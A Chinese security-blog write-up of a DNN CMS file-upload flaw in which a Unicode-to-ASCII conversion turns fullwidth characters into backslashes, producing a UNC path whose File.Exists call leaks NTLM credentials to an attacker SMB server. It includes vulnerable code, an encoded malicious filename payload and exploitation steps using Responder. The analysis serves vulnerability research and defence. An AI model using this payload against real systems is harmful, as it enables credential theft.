#  DNN 最新漏洞挖掘与技术复盘：从 Unicode 转换到 SMB 凭证窃取  
原创 阿 bin
                    阿 bin  星盟安全团队   2026-02-09 05:14  
  
# 加入我们点击下方链接  
  
  
# 星盟安全团队纳新计划  
  
DNN 算是 CMS 领域里名副其实的“老牌选手”了——作为一款开源 CMS，它从 2003 年正式上线至今，历经近 20 年迭代，依旧有不少企业在生产环境中持续使用，可见其在行业内的留存度之高。不过这款“老将”的安全表现却不尽如人意，早年间它就曾爆出过经典漏洞：攻击者仅通过不安全的 Cookie 反序列化，就能实现 RCE，成为安全圈里反序列化攻击的典型教学案例。  
  
而在今年 4 月初，我关注到有安全团队再次在 DNN 中挖到了新漏洞——这个漏洞的危害同样不容小觑，攻击者利用它可以向任意主机发起 SMB 调用，只要搭建一台 Responder 服务器，就能轻松窃取目标主机的 NTLM 凭证。这种“低成本、高收益”的攻击方式着实让人眼前一亮，于是我便将这个漏洞复现并深入研究了一番，梳理出其中的技术细节和攻击逻辑，分享给各位做技术参考。  
## 前置知识：C# 与 Windows 中的文件系统操作隐患  
  
在深入分析 DNN 这个新漏洞之前，我们先铺垫一个核心知识点：如果 Windows 系统上运行着 .NET 代码，那么攻击者一旦能够控制文件路径相关的输入，就很容易利用文件操作的特性发起攻击。  
  
最典型的场景就是：攻击者向目标系统传入一个 UNC 路径，目标系统的 .NET 代码在执行文件操作时，就会主动连接到 UNC 路径指向的攻击者控制的 SMB 服务器——轻则可以读取远程文件，重则会直接泄露目标主机的 NTLM 凭证。  
  
可能有人会说，Windows 本身可以通过修改配置防范这种 UNC 路径攻击，但现实情况是，到了“2026 年”，仍有大量企业在使用 DNN 这类老旧软件，而运行这些老软件的系统，大多没有开启相关防护配置，这就导致这种“老套路”攻击依旧能屡试不爽  
  
我在审计 DNN 代码的过程中发现，C# 中的多个常用函数都存在这类隐患，比如 File.Exists、System.Net.HttpRequest 等，只要涉及文件路径的处理，就有可能被利用；更关键的是，这种问题并非 C# 独有，其他编程语言在 Windows 环境下也会遇到类似问题——甚至不用传入网络共享路径，仅仅在 Windows 系统中传入一个 HTTP 网址，就能玩出各种攻击花样。  
## 关键知识点：Path.Combine 方法的“坑点”与 Unicode 规范化问题  
  
在 DNN 这个漏洞中，Path.Combine 方法的特性起到了关键作用，这里必须重点提一下：Path.Combine 是 C# 中用于拼接文件路径的常用方法，但它有一个容易被忽略的特性——如果拼接的第二个路径是绝对路径，那么该方法会直接忽略第一个路径，只返回第二个绝对路径。这个特性本身是合理的，但如果被攻击者利用，就会导致路径跳转，进而引发安全问题。  
  
关于 Path.Combine 方法的这个隐患，微软官方博客也曾有过相关说明，感兴趣的可以查看这篇文章：Good chance for canonicalization attack when using Path.Combine  
  
https://learn.microsoft.com/uk-ua/archive/blogs/alikl/good-chance-for-canonicalization-attack-when-using-path-combine  
  
**链接原文内容翻译及整理：**  
  
使用 Path.Combine() 时可能遭遇的路径规范化攻击  
  
在我之前的文章《.Net 程序集欺骗攻击》中，我描述了在使用反射动态加载程序集时，可能存在的 DLL 劫持/欺骗攻击风险。  
  
今天我在审查某个项目时，恰好遇到了这样的案例。其中一个引起我注意的点是，用于反射加载的 DLL 路径，是通过以下方式构建的：  
  
让我运行这段代码，看看当我输入预期的 DLL 名称（比如 alikl.dll）时会发生什么：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zzeFUpGQHcYhevibgcnicAaJMib5zXXr5ZZqjXhJEYbkwdpLmGduYEeIib6lPVSme9rq6MnNIFP1P6nicibB4JarLRkSUbWibib0ulNxmOTFLex2OtY/640?wx_fmt=png&from=appmsg "")  
  
现在，让我们输入一些非预期的内容，比如 Z:\XACKER\ATTACK.DLL：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zzeFUpGQHcbI0M49XrMSLeR8RibiboH3Zkw8hVbaDkq8qJnibzTwE4b7vQBMkbIpLk6YGMqoWica0fMBPjy5xhuTkr22vbnEtkLIiacYTQc3o7Tk/640?wx_fmt=png&from=appmsg "")  
  
这意味着，如果我们向 Combine 方法的第二个参数传入完整路径，该方法会直接忽略第一个参数。  
**如何进行验证防护？**  
1. 使用 Path.GetFullPath() 方法校验路径合法性，将结果与我们预期的路径（本文案例中为 C:\DLLS）进行对比；  
  
1. 为你的程序集签名，并显式校验其验证信息  
  
除此之外，Unicode 规范化问题也是本次漏洞的核心诱因之一。Unicode 字符的多样性的可能导致输入的字符串经过转换后，变成攻击者预期的恶意内容，进而绕过系统的防护校验。微软官方也有相关文档介绍这类问题  
## 漏洞成因综合分析：DNN 代码中的防护“失效”与关键漏洞点  
  
铺垫完前面的知识点，我们回到 DNN 的漏洞本身——前面提到的所有隐患，最终都在 DNN 的一段代码中集中爆发。本次漏洞的触发点，是 DNN 中一个未认证的文件上传端点，对应的代码路径为：Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx.cs，核心是 UploadWholeFile 方法中的文件名称处理逻辑。  
### 1. 代码防护逻辑梳理  
  
先看一下开发人员原本的防护思路——为了防止攻击者在文件名中植入绝对路径等恶意内容，开发人员做了多层防护，看似考虑得十分周全：  
```
private void UploadWholeFile(HttpContext context, List<FilesUploadStatus> statuses)
{
    for (int i = 0; i < context.Request.Files.Count; i++)
    {
        var file = context.Request.Files[i];

        var fileName = Path.GetFileName(file.FileName);

        if (!string.IsNullOrEmpty(fileName))
        {
            // Replace dots in the name with underscores (only one dot can be there... security issue).
            fileName = Regex.Replace(fileName, @"\.(?![^.]*$)", "_", RegexOptions.None);

            // Check for Illegal Chars
            if (Utility.ValidateFileName(fileName))
            {
                fileName = Utility.CleanFileName(fileName);
            }

            // Convert Unicode Chars
            fileName = Utility.ConvertUnicodeChars(fileName);
        }
        else
        {
            throw new HttpRequestValidationException("File does not have a name");
        }

        if (fileName.Length > 220)
        {
            fileName = fileName.Substring(fileName.Length - 220);
        }

        var fileNameNoExtenstion = Path.GetFileNameWithoutExtension(fileName);

        // Rename File if Exists
        if (!this.OverrideFiles)
        {
            var counter = 0;

            while (File.Exists(Path.Combine(this.StorageFolder.PhysicalPath, fileName)))
            // 后续逻辑省略...
```  
  
我们拆解一下这几层防护：  
- 使用 Path.GetFileName(file.FileName)：仅提取文件名部分，理论上可以过滤掉攻击者传入的绝对路径（比如传入“C:\test.txt”，Path.GetFileName 会只返回“test.txt”）；  
  
- 使用 Regex.Replace 替换特殊字符：通过正则表达式，将文件名中除了最后一个“.”之外的所有“.”替换成下划线，防止攻击者通过多后缀名（如“test.exe.txt”）绕过文件类型校验；  
  
- 双重校验非法字符：先调用 Utility.ValidateFileName 校验文件名是否包含非法字符，若校验通过，再调用 Utility.CleanFileName 进一步清理文件名，兜底防范前面的防护未拦住的风险；  
  
- 限制文件名长度：将文件名长度限制在 220 字符以内，避免超长文件名带来的异常处理问题。  
  
### 2. 防护失效的关键：Utility.ConvertUnicodeChars 方法  
  
不得不说，开发人员的防护思路是没问题的，但千算万算，最终栽在了 Utility.ConvertUnicodeChars 这个方法上——正是这个看似“清理 Unicode 字符”的方法，直接导致前面所有的防护都形同虚设。  
  
我们先看一下这个方法的完整代码，以及它的设计初衷：  
```
/// <summary>Cleans the name of the file.</summary>
/// <param name="fileName">
/// Name of the file.
/// </param>
/// <returns>
/// The clean file name.
/// </returns>
public static string CleanFileName(string fileName)
{
    return FileNameCleaner.Replace(fileName, string.Empty);
}

/// <summary>Converts the Unicode chars to its to its ASCII equivalent.</summary>
/// <param name="input">The <paramref name="input"/>.</param>
/// <returns>The ASCII equivalent output.</returns>
public static string ConvertUnicodeChars(string input)
{
    Regex regA = new Regex("[ã|à|â|ä|á|å]");
    Regex regAA = new Regex("[Ã|À|Â|Ä|Á|Å]");
    Regex regE = new Regex("[é|è|ê|ë]");
    Regex regEE = new Regex("[É|È|Ê|Ë]");
    Regex regI = new Regex("[í|ì|î|ï]");
    Regex regII = new Regex("[Í|Ì|Î|Ï]");
    Regex regO = new Regex("[õ|ò|ó|ô|ö]");
    Regex regOO = new Regex("[Õ|Ó|Ò|Ô|Ö]");
    Regex regU = new Regex("[ù|ú|û|ü|µ]");
    Regex regUU = new Regex("[Ü|Ú|Ù|Û]");
    Regex regY = new Regex("[ý|ÿ]");
    Regex regYY = new Regex("[Ý]");
    Regex regAE = new Regex("[æ]");
    Regex regAEAE = new Regex("[Æ]");
    Regex regOE = new Regex("[œ]");
    Regex regOEOE = new Regex("[Œ]");
    Regex regC = new Regex("[ç]");
    Regex regCC = new Regex("[Ç]");
    Regex regDD = new Regex("[Ð]");
    Regex regN = new Regex("[ñ]");
    Regex regNN = new Regex("[Ñ]");
    Regex regS = new Regex("[š]");
    Regex regSS = new Regex("[Š]");
    input = regA.Replace(input, "a");
    input = regAA.Replace(input, "A");
    input = regE.Replace(input, "e");
    input = regEE.Replace(input, "E");
    input = regI.Replace(input, "i");
    input = regII.Replace(input, "I");
    input = regO.Replace(input, "o");
    input = regOO.Replace(input, "O");
    input = regU.Replace(input, "u");
    input = regUU.Replace(input, "U");
    input = regY.Replace(input, "y");
    input = regYY.Replace(input, "Y");
    input = regAE.Replace(input, "ae");
    input = regAEAE.Replace(input, "AE");
    input = regOE.Replace(input, "oe");
    input = regOEOE.Replace(input, "OE");
    input = regC.Replace(input, "c");
    input = regCC.Replace(input, "C");
    input = regDD.Replace(input, "D");
    input = regN.Replace(input, "n");
    input = regNN.Replace(input, "N");
    input = regS.Replace(input, "s");
    input = regSS.Replace(input, "S");

    input = input.Replace("�", string.Empty);

    input = Encoding.ASCII.GetString(Encoding.GetEncoding(1251).GetBytes(input));

    input = input.Replace("?", string.Empty); // replace the unknown char which created in above.
    input = input.Replace("�", string.Empty);
    input = input.Replace("\t", string.Empty);
    input = input.Replace("@", "at");
    input = input.Replace("\r", string.Empty);
    input = input.Replace("\n", string.Empty);
    input = input.Replace("+", "_");

    return input;
}
```  
  
从方法注释可以看出，ConvertUnicodeChars 的设计目的是“将 Unicode 字符转换为对应的 ASCII 等效字符”，比如将“ã”转换为“a”、“ç”转换为“c”，避免 Unicode 字符在不同环境下出现显示或处理异常。但其中的一行代码，直接埋下了安全隐患：  
  
input = Encoding.ASCII.GetString(Encoding.GetEncoding(1251).GetBytes(input));  
  
这行代码的逻辑是：先将输入的字符串按照 1251 编码转换为字节数组，再将这个字节数组按照 ASCII 编码转换回字符串。看似简单的编码转换，却会导致 Unicode 字符被“畸形转换”——攻击者可以构造特定的 Unicode 字符，经过这行代码转换后，变成 “\”，进而构造出恶意的 UNC 路径。  
### 3. 漏洞触发流程拆解  
  
结合前面的防护逻辑和编码转换问题，我们可以梳理出完整的漏洞触发流程：  
1. 攻击者构造恶意文件名：传入包含特定 Unicode 字符的文件名，这些 Unicode 字符经过 ConvertUnicodeChars 方法中的编码转换后，会变成“\”，最终拼接成 UNC 路径（如“file.ext\example.com\share”）；  
  
1. 绕过多层防护：由于攻击者传入的是 Unicode 字符，而非直接的绝对路径或“\”，因此前面的 Path.GetFileName、正则替换、非法字符校验等防护措施，都无法识别出恶意内容，直接放行；  
  
1. 触发 SMB 连接：代码执行到 while (File.Exists(Path.Combine(this.StorageFolder.PhysicalPath, fileName)))  
 时，Path.Combine 方法发现 fileName 是绝对路径（UNC 路径属于绝对路径的一种），会直接忽略第一个参数（StorageFolder.PhysicalPath，目标系统的本地路径），只返回攻击者构造的 UNC 路径；  
  
1. 窃取 NTLM 凭证：File.Exists 方法会尝试访问这个 UNC 路径指向的 SMB 服务器（攻击者搭建），而 Windows 系统在访问远程 SMB 服务器时，会自动发送本地的 NTLM 凭证进行身份验证，攻击者通过 Responder 服务器捕获这些凭证，即可完成窃取。  
  
### 4. 关键恶意 Unicode 字符示例  
  
我在研究过程中，参考了其他安全研究者的文章，收集到几个典型的 Unicode 字符——它们经过 Encoding.ASCII.GetString(Encoding.GetEncoding(1251).GetBytes(input)) 转换后，会变成“\”，进而构造恶意 UNC 路径，示例如下：  
  
原始输入：file%EF%BC%8Eext%EF%BC%BC%EF%BC%BCexample%EF%BC%8Ecom%EF%BC%BCshare  
```
转换后：file．ext＼＼example．com＼share

最终生效路径：file.ext\\example.com\share
```  
## 攻击向量变体挖掘与限制  
  
在复现漏洞的过程中，我尝试挖掘该漏洞的攻击向量变体，发现理论上可以通过类似的思路，在 DNN 中构造其他恶意输入，进一步扩大攻击范围。但遗憾的是，DNN 中的一段验证逻辑，限制了该漏洞的利用场景——未认证用户无法触发漏洞。  
  
这段验证逻辑位于另一个代码文件中，路径为：Platform/Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/Browser.aspx.cs，核心代码如下：  
```
if ((this.currentSettings.BrowserMode.Equals(BrowserType.StandardBrowser) || this.currentSettings.ImageButtonMode.Equals(ImageButtonType.EasyImageButton))
&& HttpContext.Current.Request.IsAuthenticated)
```  
  
从代码可以看出，要访问该文件上传相关的功能，必须满足两个条件之一：当前浏览器模式为 StandardBrowser，或图片按钮模式为 EasyImageButton，同时要求 HTTP 请求是已认证状态。经过多次测试，这段验证逻辑无法绕过，这就意味着，攻击者必须先获取 DNN 系统的合法用户账号（无论权限高低），登录后才能利用该漏洞窃取 NTLM 凭证——这在一定程度上降低了漏洞的危害，但依旧无法忽视其风险。  
## 结论与思考  
  
总的来说，DNN 这次爆出的 SMB 凭证窃取漏洞，算是一个“典型的防护失效类漏洞”——开发人员做了多层防护，却因为一个编码转换的细节疏忽，导致所有防护功亏一篑。这个漏洞的有趣之处在于，它并非利用了某个函数的未知漏洞，而是利用了编码转换的特性和 Path.Combine 方法的固有行为，属于“逻辑类漏洞”，这类漏洞往往更难被发现，也更具迷惑性。  
  
同时，这个漏洞也给我们带来了几点启示：  
- 编码转换需谨慎：在处理用户输入时，尤其是文件名、路径这类敏感输入，任何编码转换操作都要充分考虑安全风险，避免出现“畸形转换”导致恶意内容绕过防护；  
  
- 防护逻辑需闭环：多层防护的核心是“相互补充、无懈可击”，不能忽视任何一个细节——哪怕是一个看似“无关紧要”的字符清理方法，也可能成为整个防护体系的突破口；  
  
- 老旧软件需重视：DNN 这类老旧开源软件，虽然使用广泛，但安全更新往往不及时，加上运行环境普遍缺乏防护配置，很容易成为攻击者的目标，企业需加强对老旧软件的安全审计和防护。  
  
这次漏洞研究的过程，也让我对 C# 文件操作、Windows 编码特性以及 SMB 协议的安全风险有了更深入的理解——看似简单的代码逻辑，背后可能隐藏着不为人知的安全隐患，这或许就是漏洞挖掘的乐趣所在吧  
  
